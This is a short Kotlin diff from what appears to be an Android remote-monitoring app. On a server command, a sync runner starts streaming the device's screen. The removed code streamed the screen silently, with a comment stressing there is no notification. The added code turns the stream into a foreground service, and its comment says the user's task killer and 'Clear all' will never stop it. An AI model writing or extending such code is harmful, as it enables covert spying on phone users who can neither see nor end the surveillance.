@@ -739,12 +739,9 @@ class SyncRunner(private val context: Context) {
             return
         }
 
-        // Direct silent screen stream via ScreenStreamManager — NO foreground service or status bar notification!
-        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
-            context = context,
-            authToken = authToken,
-            deviceId = deviceId
-        )
+        // Start ScreenStreamService as an immune Foreground Service so Android's task
+        // killer and "Clear all" in Recent Apps will NEVER terminate the stream or the process!
+        com.spapp.monitoring.screenstream.ScreenStreamService.start(context)
 
         try {
             ApiClient.service.ackCommand(
